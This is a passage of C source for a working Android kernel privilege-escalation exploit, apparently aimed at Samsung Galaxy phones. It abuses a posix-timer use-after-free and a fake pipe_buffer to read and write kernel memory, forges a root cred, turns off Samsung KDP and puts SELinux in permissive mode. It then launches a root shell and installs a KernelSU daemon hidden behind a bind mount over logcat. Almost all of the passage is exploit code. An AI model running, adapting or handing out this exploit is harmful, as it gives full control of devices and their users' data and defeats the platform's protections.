            break;
        }
        if (rp < 0)
            break;
        usleep(10000);
    }
    if (!reaped)
    {
        kill(T, SIGKILL);
        waitpid(T, &st, 0);
    }
    pin(g_cpu);
    logf("[+] plant%d reaped status=%#x (reaped=%d)\n", tag, st, reaped);
    /* The erase already fired inside release_task() above, so for a plain
     * write the payload page is no longer needed: reclaim the spray memory.
     *
     * Exception: mode 6 (pipe bootstrap).  Its erase stores the *node
     * address* into pipe->bufs, so pipe->bufs points into this very
     * payload page until the caller's merge write moves it to the user
     * marker page.  Freeing the page here left the pipe pointing at a
     * freed slab page; the next pipe operation then read whatever the
     * allocator had put there (the observed pipe_read+0x104 oops).  The
     * caller drains it once bufs has been verified. */
    if (mode != 2 && mode != 6)
        drain_spray(0);
    res->A = V + 0x78;
    res->ok = 1;
    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
         mode == 2 ? "fake" : "zero", target);
    free(payload);
}

/*
 * Stable pipe primitive: after the bootstrap plant, pipe->bufs points at
 * the user page below (through its linear alias), so the fake pipe_buffer
 * living there is edited from userspace between operations -- no further
 * timer plants needed.  read(fd) copies out the described kernel page;
 * write(fd) merges into it (PIPE_BUF_FLAG_CAN_MERGE).
 */
static void user_buf_set(unsigned char *page, unsigned long long spage,
                         unsigned int off, unsigned int len,
                         unsigned int flags)
{
    /*
     * Fill slots 1..15, never slot 0.  The array base is the rb node
     * (V+0x78), so slot 0 sits exactly on the node's __rb_parent_color /
     * rb_right / rb_left: writing a descriptor there destroys the node and
     * posix_cpu_timers_exit then trips its `node->pc == node` BUG() before
     * rb_erase ever runs (observed as brk #0x800 at +0x208).  Slots 1..15
     * are what pipe_read (bufs[tail&15]) and pipe_write (bufs[(head-1)&15])
     * actually select while tail/head stay at 1/2.
     */
    for (int i = g_bufs_ours ? 0 : 1; i < 16; i++)
    {
        unsigned char *b = page + (size_t)i * PIPE_BUF_FAKE_OFF;

        *(unsigned long long *)(b + 0x00) = spage;
        *(unsigned int *)(b + 0x08) = off;
        *(unsigned int *)(b + 0x0c) = len;
        *(unsigned long long *)(b + 0x10) =
            ANON_PIPE_BUF_OPS_STATIC + g_slide;
        *(unsigned int *)(b + 0x18) = flags;
    }
}

/*
 * Put the ring back into the prime state (head=2/tail=1: slot 1 is what
 * pipe_read takes, slot 2 is what the merge path takes, slot 0 is the rb_node
 * and must stay zero).  pipe_read() advances ->tail as it consumes buffers, so
 * every read that is not user_pipe_read() -- the marker verify's direct read()
 * for instance -- has to re-arm first or the second one sees an empty pipe.
 */
__attribute__((unused)) static void pipe_rearm(int wfd, unsigned char *page)
{
    unsigned int h = 2, t = 1;

    if (wfd < 0 || !g_pipe_addr)
        return;
    (void)user_pipe_write(wfd, page, g_pipe_addr + 0x60, &h, 4);
    (void)user_pipe_write(wfd, page, g_pipe_addr + 0x64, &t, 4);
}

static int user_pipe_read(int fd, unsigned char *page,
                          unsigned long long addr, void *buf, size_t len)
{
    size_t got = 0;

    if (addr < g_linear_lo || addr >= g_base + g_linear_span)
    {
        static int outside_logged;

        if (outside_logged++ < 3)
            logf("[pipe] read outside DRAM: %#llx (lo %#llx hi %#llx)\n",
                 addr, g_linear_lo, g_base + g_linear_span);
        else if (outside_logged == 4)
            logf("[pipe] read outside DRAM: further hits suppressed\n");
        return -1;
    }
    /*
     * Split at page boundaries instead of truncating.  One fake
     * pipe_buffer describes exactly one page, so a read that crosses 0x1000
     * has to be re-pointed mid-way; silently returning fewer bytes made
     * every caller's "exactly N bytes" check a lottery on the target
     * object's page offset (workqueue_struct, worker_pool, pwq, ...).
     */
    while (got < len)
    {
        unsigned long long a = addr + got;
        unsigned int off = (unsigned int)((a - g_base) & 0xfffULL);
        size_t chunk = 0x1000U - off;
        size_t sub = 0;

        if (chunk > len - got)
            chunk = len - got;
        user_buf_set(page, spage_of_linear(a), off, 0x1000, 0);
        /*
         * Re-arm the ring before every chunk.  pipe_read() advances
         * pipe->tail when it consumes a buffer, so with the prime's
         * head=3/tail=1 the pipe looks empty after two reads and everything
         * after that returns EAGAIN -- the scan found exactly one candidate
         * and then failed on EAGAIN for the rest.  head=1/tail=0 leaves one
         * buffer in the ring, which is all a single chunk needs.
         */
        while (sub < chunk)
        {
            ssize_t n = read(fd, (unsigned char *)buf + got + sub,
                             chunk - sub);

            if (n < 0)
            {
                if (errno == EINTR)
                    continue;
                logf("[pipe] read addr=%#llx errno=%d (fd=%d, len=%zu)\n", a,
                     errno, fd, len);
                return -1;
            }
            if (n == 0)
                logf("[pipe] read addr=%#llx returned 0\n", a);
            if (n == 0)
                break;
            sub += (size_t)n;
        }
        got += sub;
        if (sub < chunk)
            break;
    }
    return (int)got;
}

static int user_pipe_write(int fd, unsigned char *page,
                           unsigned long long addr, const void *buf,
                           size_t len)
{
    size_t done = 0;

    /* Kernel-image VAs (.data symbols) go through their linear alias.
     * g_kimage_phys is the runtime physical load address; the caller's VA
     * includes the virtual KASLR slide, so subtract it to get the static
     * image offset. */
    if (addr >= KERNEL_VA_BASE && addr < KERNEL_VA_BASE + 0x4000000ULL)
    {
        unsigned long long phys =
            g_kimage_phys + (addr - KERNEL_VA_BASE - g_slide);

        addr = g_base + phys;
    }
    /*
     * Same DRAM window as user_pipe_read -- this is the *write* path, so an
     * address outside the backed linear map is worse than a crash: it is a
     * kernel write into whatever the vmemmap arithmetic produced.
     */
    if (addr < g_linear_lo || addr >= g_base + g_linear_span)
    {
        logf("[pipe] write outside DRAM: %#llx (lo %#llx hi %#llx)\n", addr,
             g_linear_lo, g_base + g_linear_span);
        return -1;
    }
    /* Page-split like user_pipe_read.  A chunk of exactly 0x1000 would
     * make pipe_write's `chars = total_len & (PAGE_SIZE-1)` zero and skip
     * the merge path, so cap every chunk at 0xfff. */
    while (done < len)
    {
        unsigned long long a = addr + done;
        unsigned int off = (unsigned int)((a - g_base) & 0xfffULL);
        size_t chunk = 0x1000U - off;
        ssize_t n;
        int e;

        if (chunk > 0xfffU)
            chunk = 0xfffU;
        if (chunk > len - done)
            chunk = len - done;
        user_buf_set(page, spage_of_linear(a), off, 0, 0x10); /* CAN_MERGE */
        errno = 0;
        n = write(fd, (const unsigned char *)buf + done, chunk);
        e = errno;
        if (n != (ssize_t)chunk)
            logf("[+] user_pipe_write addr=%#llx off=%#x n=%zd errno=%d\n", a,
                 off, n, e);
        if (n <= 0)
            break;
        done += (size_t)n;
        if ((size_t)n < chunk)
            break;
    }
    return (int)done;
}

/*
 * pipefake: after the proven pipe bootstrap, install a fully-formed fake
 * cred in the user page and point task->cred at it with pipe writes.  No
 * mode-2 timer plant and no per-field zero plants are needed; the fake cred
 * has uid 0 and FULLCAP from the start, so the child only forks.
 */
static int pipefake_resolve_kimage(int rfd, unsigned char *mark)
{
    static const unsigned long long cands[] = { KERNEL_PHYS_CANDIDATES };
    unsigned char kb[0x200];

    for (unsigned i = 0; i < sizeof(cands) / sizeof(cands[0]); i++)
    {
        for (int variant = 0; variant < 2; variant++)
        {
            unsigned long long wq = 0;
            char *nm;

            g_kimage_phys = cands[i] +
                (variant ? (unsigned long long)g_slide : 0ULL);
            if (user_pipe_read(rfd, mark,
                               alias_of_kimg(SYSTEM_UNBOUND_WQ_STATIC),
                               &wq, 8) != 8)
                continue;
            if (wq < g_base || wq >= 0xffffffc000000000ULL)
                continue;
            if (user_pipe_read(rfd, mark, wq, kb, 0x200) != 0x200)
                continue;
            nm = (char *)(kb + 0xc0);
            if (strncmp(nm, "events_unbound", 14) == 0)
            {
                logf("[+] pipefake phys=%#llx name=%.24s\n",
                     g_kimage_phys, nm);
                return 1;
            }
        }
    }
    return 0;
}

/*
 * Switch Samsung KDP off before task->cred is pointed at a page KDP never
 * registered.  Ported from the S928B/EZIF branch, whose comment records the
 * failure this avoids: security_integrity_current() panics with
 * "KDP CRED PROTECTION VIOLATION" on the first context switch when
 * task->cred is not a KDP-tracked cred.  The gate is one byte (kdp_enable,
 * verified in this image's disassembly); with it at 0 the check is skipped
 * and kdp_get_usecount()/inc/dec fall back to cred->usage.
 *
 * One byte, not an 8-byte zero plant: kdp_enable is byte-wide and the
 * neighbouring KDP globals should keep their values.  KDP watches the
 * kernel-image mapping of the page, so the write goes through the
 * linear-map alias -- user_pipe_write() converts image VAs exactly that way
 * once g_kimage_phys has been validated by the wq-name check.
 */
static int pipefake_kdp_off(int rfd, int wfd, unsigned char *mark)
{
    unsigned char z = 0, rb = 0xff;
    unsigned long long addr = KDP_ENABLE_STATIC + g_slide;

    if (user_pipe_write(wfd, mark, addr, &z, 1) != 1)
    {
        logf("[-] kdp_enable write failed\n");
        return -1;
    }
    if (user_pipe_read(rfd, mark, addr, &rb, 1) != 1)
    {
        logf("[-] kdp_enable readback failed\n");
        return -1;
    }
    logf("[+] kdp_enable=%u alias=%#llx (KDP cred check off)\n", rb,
         alias_of_kimg(KDP_ENABLE_STATIC));
    return rb == 0 ? 0 : -1;
}

static void pipefake_install(int rfd, int wfd, unsigned char *mark,
                             unsigned long long mark_va, unsigned char *raw)
{
    static const unsigned long long cred_zeros[] = {
        0x04, /* uid */
        0x08, /* gid */
        0x0c, /* suid */
        0x10, /* sgid */
        0x14, /* euid */
        0x18, /* egid */
        0x1c, /* fsuid */
        0x20, /* fsgid */
        0x24, /* securebits: drop SECURE_NOROOT so exec keeps caps */
    };
    struct plant_res fc;
    unsigned long long cred, zero = 0;
    unsigned char byte = 0;
    unsigned int z32 = 0;
    int wn = 0;

    (void)mark_va;
    if (!g_slide_set || !g_child_task || g_child_go_fd < 0 ||
        mark == (unsigned char *)MAP_FAILED)
        park_forever("pipefake missing state");
    /*
     * Kernel-image writes (kdp_enable, creds_fast_hash, selinux_state) must
     * use the physical load validated by the same wq-name check as umhpipe.
     * Do that first: KDP has to be off *before* task->cred points at a page
     * KDP never registered, otherwise the child dies on its first context
     * switch with "KDP CRED PROTECTION VIOLATION".
     */
    if (!pipefake_resolve_kimage(rfd, mark))
        park_forever("pipefake wq phys resolve failed");
    if (pipefake_kdp_off(rfd, wfd, mark))
        park_forever("pipefake kdp_enable off failed");
    /*
     * The fake cred must live in a kernel slab page, not in the user
     * mapping: task_defex_check_creds()/KDP rejects a cred whose backing
     * page is a user page ("KDP CRED PROTECTION VIOLATION").  One mode-2
     * timer plant puts it on the reclaimed posix-timer slab page and sets
     * task->cred to the node address; the pipe then repairs the dirty
     * uid/gid/suid/sgid/euid/egid fields deterministically.
     */
    memset(&fc, 0, sizeof(fc));
    if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred", raw,
                    &fc, 0) || !fc.A)
        park_forever("pipefake fake_cred stage failed");
    cred = fc.A;
    logf("[+] pipefake kernel fake cred=%#llx; pipe-fixing fields\n",
         cred);
    for (unsigned i = 0; i < sizeof(cred_zeros) / sizeof(cred_zeros[0]); i++)
        wn += user_pipe_write(wfd, mark, cred + cred_zeros[i], &z32, 4);
    wn += user_pipe_write(wfd, mark, g_child_task + 0x790, &cred, 8);
    wn += user_pipe_write(wfd, mark, g_child_task + 0x798, &cred, 8);
    user_pipe_write(wfd, mark,
                    CREDS_FAST_HASH_STATIC +
                        ((unsigned long long)g_child_pid << 3),
                    &zero, 8);
    user_pipe_write(wfd, mark, SELINUX_STATE_STATIC + g_slide, &byte, 1);
    usleep(20000);
    logf("[+] pipefake cred=%#llx task=%#llx pid=%d writes=%d "
         "selinux=%d\n", cred, g_child_task, g_child_pid, wn,
         selinux_is_permissive());
    if (selinux_is_permissive() != 1)
        park_forever("pipefake selinux not permissive");
    if (write(g_child_go_fd, "A", 1) != 1)
        logf("[!] pipefake child wake failed\n");
    close(g_child_go_fd);
    park_forever("pipefake child running (do not kill)");
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode,
                                    unsigned long long *task_out)
{
    for (int attempt = 0; attempt < 4; attempt++)
    {
        int go[2], st[2];
        pid_t p;
        long n;
        int c = 0, hello = 0, hello_ok = 0, tc = 0;
        unsigned long long R = 0, site = 0, task = 0;

        if (pipe(go) || pipe(st))
            return 0;
        /*
         * Start tracing before fork so copy_process()'s task_struct
         * allocation is in the buffer.  The exec cred allocation follows.
         */
        trace_start();
        p = fork();
        if (p == 0)
        {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                const char *cmode = shell_mode ? "shell" :
                    (g_pipe_fake ? "pipefake" :
                     (g_fake_stage ? "fake" : "verify"));
                char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                    (char *)cmode, NULL};
                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};

                execve("/proc/self/exe", av, ep);
            }
            _exit(127);
        }
        if (p < 0)
        {
            close(go[0]);
            close(go[1]);
            close(st[0]);
            close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        /*
         * Keep tracing until the child reports that execve() returned.
         * prepare_ro_creds()/commit_creds() runs late in begin_new_exec;
         * a fixed 50 ms cutoff can miss the KDP cred_jar_ro allocations
         * entirely, leaving scan_cred_allocs() with only the normal cred.
         */
        {
            struct pollfd hf = {.fd = st[0], .events = POLLIN};

            if (poll(&hf, 1, 1000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                hello == CHILD_HELLO)
                hello_ok = 1;
        }
        trace_stop();
        n = read_cpu(g_cpu, raw, 48u << 20);
        if (n > 0)
        {
            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
            /*
             * Derive this boot's slide from the leaked cred call site
             * (prepare_creds' kmem_cache_alloc return address) and expect
             * dup_task_struct's kmem_cache_alloc_node site shifted by it.
             */
            if (c && site && !g_slide_set)
            {
                g_slide = site - CRED_SITE_STATIC;
                g_slide_set = 1;
                logf("[+] slide=%#llx (from cred site %#llx)\n",
                     g_slide, site);
            }
            if (c && site)
                tc = scan_task_allocs(raw, (size_t)n, getpid(), &task,
                                      site - CRED_SITE_STATIC +
                                          TASK_SITE_STATIC);
            else
                tc = scan_task_allocs(raw, (size_t)n, getpid(), &task, 0);
        }
        if (R && (!g_fake_stage || task) && hello_ok)
        {
            logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                 "recs=%d task=%#llx task_recs=%d\n",
                 attempt, p, R, site & 0x1fffff, c, task, tc);
            *out_pid = p;
            *out_go = go[1];
            *out_st = st[0];
            *task_out = task;
            return R;
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
             "task=%#llx task_recs=%d failed\n",
             attempt, p, R, hello, c, task, tc);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

/*
 * Re-exec'd by the shell-mode child after setuid(0).  Only now, with
 * euid 0, does the exec hand back the bounding-set capabilities, which
 * include CAP_SETGID.  Adding supplementary groups 1000 (system) and
 * 2000 (shell) lets the shell read /data, /data/app and
 * /data/local/tmp without changing euid, so the capabilities survive.
 */
static int setshell_main(const char *mode)
{
    gid_t groups[64];
    static const gid_t extra[] = {1000, 2000};
    int n = getgroups((int)(sizeof(groups) / sizeof(groups[0])), groups);
    int added = 0;
    {
        FILE *sf = fopen("/proc/self/status", "r");
        char line[256];

        if (sf)
        {
            while (fgets(line, sizeof(line), sf))
                if (!strncmp(line, "Uid:", 4) || !strncmp(line, "Gid:", 4) ||
                    !strncmp(line, "CapInh:", 7) || !strncmp(line, "CapPrm:", 7) ||
                    !strncmp(line, "CapEff:", 7) || !strncmp(line, "CapBnd:", 7) ||
                    !strncmp(line, "NoNewPrivs:", 11))
                    logf("[setshell] %s", line);
            fclose(sf);
        }
        logf("[setshell] securebits=%ld\n",
             (long)prctl(PR_GET_SECUREBITS, 0, 0, 0, 0));
    }

    if (n < 0)
        n = 0;
    for (size_t i = 0; i < sizeof(extra) / sizeof(extra[0]); i++)
    {
        int have = 0;

        for (int j = 0; j < n; j++)
            if (groups[j] == extra[i])
                have = 1;
        if (!have && n < (int)(sizeof(groups) / sizeof(groups[0])))
        {
            groups[n++] = extra[i];
            added++;
        }
    }
    if (n && setgroups(n, groups) != 0)
        logf("[!] setgroups failed errno=%d\n", errno);
    else
        logf("[+] supplementary groups: +%d (1000/2000)\n", added);

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        if (!strcmp(mode, "shell"))
        {
            /* Print `id` first: front ends (TimerRoot) poll for the
             * "uid=0(root)" marker to know the shell is live before they
             * start writing commands to its stdin. */
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; exec /system/bin/sh -i", NULL};

            execve("/system/bin/sh", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

/*
 * UMH helper (runs as /data/local/tmp/samtimer/uhexec via call_usermodehelper,
 * so this process has a genuine kernel-issued root cred -- no forgery,
 * and its death is an ordinary exit).  The usermodehelper context has
 * /dev/null stdio, so redirect to a log first; the parent waits for the
 * marker file as its readiness signal.  Then hand off to the usual stage
 * script: init domain, private mount ns, ksud bind-mounted over logcat
 * (KDP-safe exec), late-load.
 */
static int setksu_main(void)
{
    int fd;

    fd = open("/data/local/tmp/samtimer/umh-kdp.log",
              O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0)
    {
        (void)dup2(fd, 1);
        (void)dup2(fd, 2);
        if (fd > 2)
            close(fd);
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    logf("[umh] helper start uid=%d ctx=%s enf=%d\n", getuid(), "self",
         open("/sys/fs/selinux/enforce", O_RDONLY) >= 0 ? 1 : 0);
    fd = open("/proc/self/attr/current", O_WRONLY);
    if (fd >= 0)
    {
        (void)!write(fd, "u:r:init:s0", 11);
        close(fd);
    }
    if (unshare(CLONE_NEWNS) == 0)
    {
        (void)mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
        (void)mount("/data/local/tmp/samtimer/ksud", "/system/bin/logcat",
                    NULL, MS_BIND, NULL);
    }
    /* Readiness marker: the exploit parent polls for this file. */
    fd = open("/data/local/tmp/samtimer/umh-action.log",
              O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0)
        close(fd);
    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};
        char *const av[] = {(char *)"sh",
                            (char *)"/data/local/tmp/ksu_stage.sh", NULL};

        execve("/system/bin/sh", av, envp);
    }
    logf("[umh] exec failed errno=%d\n", errno);
    _exit(127);
}

static void dbg_mark(const char *s)
{
    int fd = open("/data/local/tmp/samtimer/mark",
                  O_WRONLY | O_CREAT | O_APPEND, 0644);

    if (fd >= 0)
    {
        (void)write(fd, s, strlen(s));
        (void)write(fd, "\n", 1);
        close(fd);
    }
}

static int wait_child_main(const char *mode)
{
    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;
    int fake_mode = !strcmp(mode, "fake") || !strcmp(mode, "pipefake");

    /* Unbuffered: if the child dies to a kernel fault its logs survive. */
    setvbuf(stdout, NULL, _IONBF, 0);
    pin(g_cpu);
    logf("[child] alive, waiting for go\n");
    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
        _exit(130);
    if (read(3, &ch, 1) != 1)
        _exit(131);
    close(3);
    logf("[child] go received, calling getuid\n");

    memset(&rep, 0, sizeof(rep));
    rep.magic = CHILD_MAGIC;
    rep.uid = (int)syscall(SYS_getuid);
    rep.euid = (int)syscall(SYS_geteuid);
    logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
    if (rep.uid != 0)
    {
        rep.setuid_ret = -1;
        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[-] child uid is not 0: cred write did not land\n");
        _exit(3);
    }

    if (fake_mode)
    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};
        int st = 0;
        pid_t w;

        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[fake] child uid=%d euid=%d; forking worker\n",
             rep.uid, rep.euid);
        w = fork();
        if (w == 0)
        {
            dbg_mark("worker:start");
            if (!strcmp(mode, "pipefake") && getenv("SAMTIMER_SKIP_INIT"))
            {
                /*
                 * Debug path with DFRoot's KSU already live: SELinux is
                 * still Enforcing, so switching to init would lose access
                 * to /data/local/tmp.  Stay in the shell domain and let
                 * ksu_stage.sh take its already_live early exit.
                 */
                dbg_mark("worker:skip_init_ksu_live");
                goto fake_exec;
            }
            /*
             * While the exploit still holds SELinux permissive, move this
             * worker to the init domain: KSU's sepolicy only allows init
             * to reach the ksud domain (DirtyFrag bootstrap flow).
             */
            {
                int cfd = open("/proc/self/attr/current", O_WRONLY);

                if (cfd >= 0)
                {
                    ssize_t sn = write(cfd, "u:r:init:s0", 11);

                    close(cfd);
                    dbg_mark(sn == 11 ? "worker:setcon_ok"
                                      : "worker:setcon_fail");
                }
                else
                    dbg_mark("worker:setcon_open_fail");
            }
            /*
             * Android 16+ KDP SIGKILLs a directly exec'ed kdp-variant ksud
             * (exit 137).  Hide it behind a bind mount over
             * /system/bin/logcat inside a private mount namespace and exec
             * that path instead (fusion-s24u verified flow on S24U).
             */
            logf("[fake] pre-unshare ctx=%s\n",
                 mode && 0 ? "" : "");
            {
                char ctxbuf[128];
                int cfd = open("/proc/self/attr/current", O_RDONLY);

                if (cfd >= 0)
                {
                    int cn = read(cfd, ctxbuf, sizeof(ctxbuf) - 1);

                    if (cn > 0)
                    {
                        ctxbuf[cn] = 0;
                        logf("[fake] worker ctx=%s", ctxbuf);
                    }
                    close(cfd);
                }
            }
fake_exec:
            if (!strcmp(mode, "pipefake") && getenv("SAMTIMER_SKIP_INIT"))
            {
                /* debug only: KSU already live, skip init/bind */
            }
            else if (unshare(CLONE_NEWNS) == 0)
            {
                (void)mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
                logf("[fake] bind rc=%d errno=%d\n",
                     (int)mount("/data/local/tmp/samtimer/ksud", "/system/bin/logcat",
                                NULL, MS_BIND, NULL),
                     errno);
            }
            else
                logf("[fake] unshare failed errno=%d\n", errno);
            dbg_mark("worker:after_unshare");
            dbg_mark("worker:before_exec");
            logf("[fake] exec'ing sh ksu_stage.sh\n");
            {
                char *const av[] = {(char *)"sh",
                                    (char *)"/data/local/tmp/ksu_stage.sh",
                                    NULL};

                execve("/system/bin/sh", av, envp);
            }
            logf("[fake] exec FAILED errno=%d\n", errno);
            {
                char mb[64];

                snprintf(mb, sizeof(mb), "worker:exec_fail errno=%d",
                         errno);
                dbg_mark(mb);
            }
            _exit(127);
        }
        if (w > 0)
            waitpid(w, &st, 0);
        logf("[fake] worker exit=%#x\n", st);
        _exit(0);
    }

    /*
     * Plant 1 zeroes uid+gid only; egid is still 2000.  If it stays that way
     * across execve(), cap_bprm's setgid downgrade intersects permitted with
     * the old (empty) set and the expanded bset never becomes effective.
     */
    errno = 0;
    {
        long sg = syscall(SYS_setresgid, 0, 0, 0);

        logf("[child] setresgid(0)=%ld errno=%d\n", sg, errno);
    }
    errno = 0;
    rep.setuid_ret = (int)syscall(SYS_setuid, 0);
    rep.setuid_errno = errno;
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    (void)write(4, &rep, sizeof(rep));
    close(4);
    logf("[child] setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
         rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
    if (rep.setuid_ret != 0)
    {
        logf("[-] setuid(0) failed; not running a shell\n");
        _exit(4);
    }

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        if (!strcmp(mode, "shell"))
        {
            /*
             * Re-exec ourselves: the euid=0 exec grants the bset caps
             * (CAP_SETGID) needed to add the /data and /data/local/tmp
             * supplementary groups before handing over to the real sh.
             */
            char *const av[] = {(char *)"timer", (char *)"setshell",
                                (char *)"shell", NULL};

            execve("/proc/self/exe", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

/*
 * Wake an idle system_unbound_wq worker (BuSung-dev/Root-My-Galaxy
 * reference kick): opening and closing a pty pair queues tty hangup
 * works on system_unbound_wq, which wakes a pool worker.
 */
static int wake_system_unbound(void)
{
    char slave_name[128];
    int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
    int slave_fd;

    if (master_fd < 0 || grantpt(master_fd) != 0 ||
        unlockpt(master_fd) != 0 ||
        ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0)
    {
        if (master_fd >= 0)
            close(master_fd);
        return 0;
    }
    slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
    if (slave_fd < 0)
    {
        close(master_fd);
        return 0;
    }
    close(master_fd);
    close(slave_fd);
    return 1;
}

/*
 * "probe": safe on-device measurement -- no plant, no UAF, no race.  Every
 * step only creates/deletes userspace-visible objects and reads the trace.
 *
 * It answers the two questions the public ports had to measure on-device
 * before their reclaim worked at all (vivo GKI research docs/08 and /19):
 *
 *   1. does a batch thread-timer free really hand order-1 pages back to the
 *      buddy (SLUB discard), and at what rate?  Their measurement was
 *      91 order-1 frees for 97 slabs (~94%); near zero means the batch stays
 *      on the cache partial list and no spray can ever win;
 *   2. which order does an 8 KiB AF_UNIX write allocate from?  That is the
 *      allocation that carries our payload, and it decides whether the hit
 *      check may look at order 1 only (their table: 8 KiB stream data went to
 *      kmalloc-8k, i.e. a larger slab page, not an order-1 frag).
 */
static int probe_scan_allocs(const unsigned char *b, size_t n, int pid,
                             char *out, size_t outsz)
{
    size_t off = 0;
    int cnt = 0;

    for (size_t i = 8; i + 12 <= n; i += 4)
    {
        int order;

        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        if ((int)u32(b, i - 4) != pid)
            continue;
        order = (int)u32(b, i + 8);
        if (order < 0 || order > 10)
            continue;
        if (cnt < 8 && off + 48 < outsz)
            off += (size_t)snprintf(out + off, outsz - off, " o%d/pfn=%#llx",
                                    order, u64(b, i));
        cnt++;
    }
    return cnt;
}

static void probe_scan_frees(const unsigned char *b, size_t n, int pid,
                             int *order1, int *order0, int *any1)
{
    for (size_t i = 8; i + 12 <= n; i += 4)
    {
        int order;

        if ((u32(b, i - 8) & 0xffff) != g_t_page_free)
            continue;
        order = (int)u32(b, i + 8);
        if (order != 1)
        {
            if (order == 0 && (int)u32(b, i - 4) == pid)
                (*order0)++;
            continue;
        }
        /*
         * SLUB can discard an emptied slab from a workqueue/kswapd context
         * rather than from the freeing thread, so count order-1 frees from
         * every pid as well: order1 == 0 && any1 > 0 means "the page did go
         * back to the buddy, just not in our context" (which also means the
         * per-plant `discarded` counter, pinned to the victim's tid, can
         * under-report).
         */
        (*any1)++;
        if ((int)u32(b, i - 4) == pid)
            (*order1)++;
    }
}

/* posix_timers_cache counters from /proc/slabinfo (readable as shell here):
 * an independent oracle for "did the batch free actually return slabs". */
static void probe_slabinfo(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
    {
        logf("[probe] %s slabinfo unreadable errno=%d\n", tag, errno);
        return;
    }
    while (fgets(line, sizeof(line), f))
    {
        unsigned act = 0, tot = 0, sz = 0, obj = 0, pgs = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u %u %u %u", &act, &tot,
                   &sz, &obj, &pgs) == 5)
            logf("[probe] %s slabinfo active=%u total=%u obj/slab=%u "
                 "pages/slab=%u\n", tag, act, tot, obj, pgs);
        break;
    }
    fclose(f);
}

static int probe_main(unsigned char *raw)
{
    char det[256];
    long ps = sysconf(_SC_PAGESIZE);

    logf("[probe] page_size=%ld (this port assumes %lu)\n", ps,
         (unsigned long)PAGE);
    logf("[probe] tracefs_writable=%d selinux_permissive=%d\n",
         wr(TR "/tracing_on", "0") == 0, selinux_is_permissive());
    {
        FILE *lf = fopen("/proc/loadavg", "r");
        char lb[64] = "?";
        FILE *mf = fopen("/proc/meminfo", "r");
        char mb[128] = "?";
